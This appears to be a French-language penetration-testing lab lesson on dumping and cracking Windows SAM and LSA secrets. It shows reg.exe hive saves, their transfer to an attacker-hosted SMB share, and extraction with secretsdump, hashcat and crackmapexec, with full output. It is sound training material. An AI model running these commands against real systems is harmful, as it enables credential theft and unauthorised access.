# Attaquer SAM

Avec l'accès à un système Windows non joint à un domaine, nous pouvons bénéficier d'une tentative de vidage rapide des fichiers associés à la base de données SAM pour les transférer vers notre hôte d'attaque et commencer à craquer les hachages hors ligne. Faire cela hors ligne garantira que nous pouvons continuer à tenter nos attaques sans maintenir une session active avec une cible. Passons en revue ce processus ensemble en utilisant un hôte cible. N'hésitez pas à suivre en faisant apparaître la zone cible dans cette section.

Copie des ruches du registre SAM
Il existe trois ruches de registre que nous pouvons copier si nous avons un accès administrateur local sur la cible ; chacun aura un objectif spécifique lorsque nous arriverons à vider et à casser les hachages. Voici une brève description de chacun dans le tableau ci-dessous :

| Ruche de registre | Descriptif |
| --- | --- |
| `hklm\sam` | Contient les hachages associés aux mots de passe des comptes locaux. Nous aurons besoin des hachages pour pouvoir les déchiffrer et obtenir les mots de passe des comptes d'utilisateurs en texte clair. |
| `hklm\système` | Contient la clé de démarrage du système, qui est utilisée pour chiffrer la base de données SAM. Nous aurons besoin de la bootkey pour déchiffrer la base de données SAM. |
| `hklm\sécurité` | Contient les informations d'identification mises en cache pour les comptes de domaine. Nous pouvons bénéficier de cela sur une cible Windows jointe à un domaine. |

## Utilisation de reg.exe enregistrer pour copier les ruches du registre
Le lancement de CMD en tant qu'administrateur nous permettra d'exécuter reg.exe pour enregistrer des copies des ruches de registre susmentionnées. Exécutez ces commandes ci-dessous pour ce faire :
```
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

Techniquement, nous n'aurons besoin que de hklm\sam & hklm\system, mais hklm\security peut également être utile pour enregistrer car il peut contenir des hachages associés aux identifiants de compte d'utilisateur de domaine mis en cache présents sur les hôtes joints au domaine. Une fois les ruches enregistrées hors ligne, nous pouvons utiliser différentes méthodes pour les transférer vers notre hôte d'attaque. Dans ce cas, utilisons smbserver.py d'Impacket en combinaison avec quelques commandes CMD utiles pour déplacer les copies de la ruche vers un partage créé sur notre hôte d'attaque.

## Création d'un partage avec smbserver.py
Tout ce que nous devons faire pour créer le partage est d'exécuter smbserver.py -smb2support en utilisant python, donner un nom au partage (CompData) et spécifier le répertoire sur notre hôte d'attaque où le partage stockera les copies de la ruche (/home/ltnbob/Documents ). Sachez que l'option smb2support garantira que les nouvelles versions de SMB sont prises en charge. Si nous n'utilisons pas cet indicateur, des erreurs se produiront lors de la connexion de la cible Windows au partage hébergé sur notre hôte d'attaque. Les versions plus récentes de Windows ne prennent pas en charge SMBv1 par défaut en raison des nombreuses vulnérabilités graves et des exploits accessibles au public.

```
dsgsec@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Une fois que le partage est exécuté sur notre hôte d'attaque, nous pouvons utiliser la commande move sur la cible Windows pour déplacer les copies de la ruche vers le partage.

```
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```

Ensuite, nous pouvons confirmer que nos copies de ruche ont été déplacées avec succès vers le partage en naviguant vers le répertoire partagé sur notre hôte d'attaque et en utilisant ls pour répertorier les fichiers.

```
dsgsec@htb[/htb]$ ls

sam.save  security.save  system.save
```

## Dump des Hashes avec secretsdump.py d'Impacket
Secretsdump.py d'Impacket est un outil incroyablement utile que nous pouvons utiliser pour vider les hachages hors ligne. Impacket peut être trouvé sur la plupart des distributions de tests de pénétration modernes. Nous pouvons le vérifier en utilisant locate sur un système basé sur Linux :
```
dsgsec@htb[/htb]$ locate secretsdump 
```

L'utilisation de secretsdump.py est un processus simple. Tout ce que nous devons faire est d'exécuter secretsdump.py en utilisant Python, puis de spécifier chaque fichier de ruche que nous avons récupéré à partir de l'hôte cible.

```
dsgsec@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3dd5a5ef0ed25b8d6add8b2805cce06b:::
defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:683b72db605d064397cf503802b51857:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
sam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::
rocky:1003:aad3b435b51404eeaad3b435b51404ee:184ecdda8cf1dd238d438c4aea4d560d:::
ITlocal:1004:aad3b435b51404eeaad3b435b51404ee:f7eb9c06fafaa23c4bcf22ba6781c1e2:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643
dpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362
[*] NL$KM 
 0000   D7 0A F4 B9 1E 3E 77 34  94 8F C4 7D AC 8F 60 69   .....>w4...}..`i
 0010   52 E1 2B 74 FF B2 08 5F  59 FE 32 19 D6 A7 2C F8   R.+t..._Y.2...,.
 0020   E2 A4 80 E0 0F 3D F8 48  44 98 87 E1 C9 CD 4B 28   .....=.HD.....K(
 0030   9B 7B 8B BF 3D 59 DB 90  D8 C7 AB 62 93 30 6A 42   .{..=Y.....b.0jB
NL$KM:d70af4b91e3e7734948fc47dac8f606952e12b74ffb2085f59fe3219d6a72cf8e2a480e00f3df848449887e1c9cd4b289b7b8bbf3d59db90d8c7ab6293306a42
[*] Cleaning up... 

```

Ici, nous voyons que secretsdump vide avec succès les hachages SAM locaux et aurait également vidé les informations de connexion au domaine en cache si la cible était jointe au domaine et avait des informations d'identification en cache présentes dans hklm\security. Notez que la première étape que secretsdump exécute cible la clé de démarrage du système avant de procéder au vidage des hachages SAM LOCAL. Il ne peut pas vider ces hachages sans la clé de démarrage car cette clé de démarrage est utilisée pour chiffrer et déchiffrer la base de données SAM, c'est pourquoi il est important pour nous d'avoir des copies des ruches de registre dont nous avons parlé précédemment dans cette section. Remarquez en haut de la sortie secretsdump.py :

```
Dumping local SAM hashes (uid:rid:lmhash:nthash)
```

Cela nous indique comment lire la sortie et quels hachages nous pouvons craquer. La plupart des systèmes d'exploitation Windows modernes stockent le mot de passe sous forme de hachage NT. Les systèmes d'exploitation antérieurs à Windows Vista et Windows Server 2008 stockent les mots de passe sous forme de hachage LM, nous ne pouvons donc bénéficier de leur craquage que si notre cible est un ancien système d'exploitation Windows.

Sachant cela, nous pouvons copier les hachages NT associés à chaque compte utilisateur dans un fichier texte et commencer à déchiffrer les mots de passe. Il peut être avantageux de noter chaque utilisateur, afin que nous sachions quel mot de passe est associé à quel compte d'utilisateur.

## Craquer des hachages avec Hashcat

Une fois que nous avons les hachages, nous pouvons commencer à essayer de les déchiffrer en utilisant Hashcat. Nous l'utiliserons pour tenter de déchiffrer les hachages que nous avons rassemblés. Si nous jetons un coup d'œil au site Web Hashcat, nous remarquerons la prise en charge d'un large éventail d'algorithmes de hachage. Dans ce module, nous utilisons Hashcat pour des cas d'utilisation spécifiques. Cela devrait nous aider à développer l'état d'esprit et la compréhension nécessaires pour utiliser Hashcat et à savoir quand nous devons consulter la documentation de Hashcat pour comprendre le mode et les options que nous devons utiliser en fonction des hachages que nous capturons.

Comme mentionné précédemment, nous pouvons remplir un fichier texte avec les hachages NT que nous avons pu vider.

```
dsgsec@htb[/htb]$ sudo vim hashestocrack.txt

64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
```

Maintenant que les hachages NT sont dans notre fichier texte (hashestocrack.txt), nous pouvons utiliser Hashcat pour les casser.

### Exécuter Hashcat sur NT Hashes
Hashcat a de nombreux modes différents que nous pouvons utiliser. La sélection d'un mode dépend en grande partie du type d'attaque et du type de hachage que nous voulons craquer. Couvrir chaque mode dépasse le cadre de ce module. Nous nous concentrerons sur l'utilisation de -m pour sélectionner le type de hachage 1000 afin de casser nos hachages NT (également appelés hachages basés sur NTLM). Nous pouvons nous référer à la page wiki de Hashcat ou à la page de manuel pour voir les types de hachage pris en charge et leur numéro associé. Nous utiliserons la tristement célèbre liste de mots rockyou.txt mentionnée dans la section Stockage des identifiants de ce module.

```
dsgsec@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

f7eb9c06fafaa23c4bcf22ba6781c1e2:dragon          
6f8c3f4d3869a10f3b4f0522f537fd33:iloveme         
184ecdda8cf1dd238d438c4aea4d560d:adrian          
31d6cfe0d16ae931b73c59d7e0c089c0:                
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Hash.Target......: dumpedhashes.txt
Time.Started.....: Tue Dec 14 14:16:56 2021 (0 secs)
Time.Estimated...: Tue Dec 14 14:16:56 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    14284 H/s (0.63ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 5/5 (100.00%) Digests
Progress.........: 8192/14344385 (0.06%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 4096/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: newzealand -> whitetiger

Started: Tue Dec 14 14:16:50 2021
Stopped: Tue Dec 14 14:16:58 2021

```

## Remote Dumping & LSA Secrets Considerations
Avec l'accès aux informations d'identification avec des privilèges d'administrateur local, il nous est également possible de cibler les secrets LSA sur le réseau. Cela pourrait nous permettre d'extraire les informations d'identification d'un service en cours d'exécution, d'une tâche planifiée ou d'une application qui utilise des secrets LSA pour stocker les mots de passe.
```
dsgsec@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

SMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
SMB         10.129.42.198   445    WS01     [+] Dumping LSA secrets
SMB         10.129.42.198   445    WS01     WS01\worker:Hello123
SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.42.198   445    WS01     NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
SMB         10.129.42.198   445    WS01     [+] Dumped 3 LSA secrets to /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.secrets and /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.cached
```
### Dumping SAM Remotely
```
dsgsec@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

SMB         10.129.42.198   445    WS01      [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:WS01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.42.198   445    WS01      [+] Dumping SAM hashes
SMB         10.129.42.198   445    WS01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
SMB         10.129.42.198   445    WS01     bob:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
SMB         10.129.42.198   445    WS01     sam:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
SMB         10.129.42.198   445    WS01     rocky:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
SMB         10.129.42.198   445    WS01     worker:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
SMB         10.129.42.198   445    WS01     [+] Added 8 SAM hashes to the database
```
